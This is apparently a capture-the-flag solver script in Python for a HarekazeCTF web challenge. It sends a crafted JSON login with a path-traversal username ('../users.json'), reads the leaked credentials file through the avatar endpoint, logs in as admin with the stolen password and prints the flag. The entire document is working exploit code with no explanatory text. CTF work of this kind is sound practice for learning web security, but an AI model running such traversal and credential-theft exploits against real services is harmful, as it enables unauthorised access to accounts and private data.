import json
import os
import re
import requests

host = os.getenv('HOST', '0.0.0.0')
port = os.getenv('PORT', '8001')
url = 'http://{}:{}/'.format(host, port)

# extract admin's password
sess = requests.Session()
sess.post(url + 'login', headers={
  'Content-Type': 'application/json'
}, data=json.dumps({
  'username': ['../users.json'],
  'password': None
}))

r = sess.get(url + 'myavatar.png')
for username, password in r.json().items():
  if username.startswith('admin'):
    break

# log in as admin
sess.post(url + 'login', headers={
  'Content-Type': 'application/json'
}, data=json.dumps({
  'username': [username],
  'password': password
}))

r = sess.get(url + 'admin')
flag = re.findall(r'(HarekazeCTF\{.+?\})', r.text)[0]
print(flag)
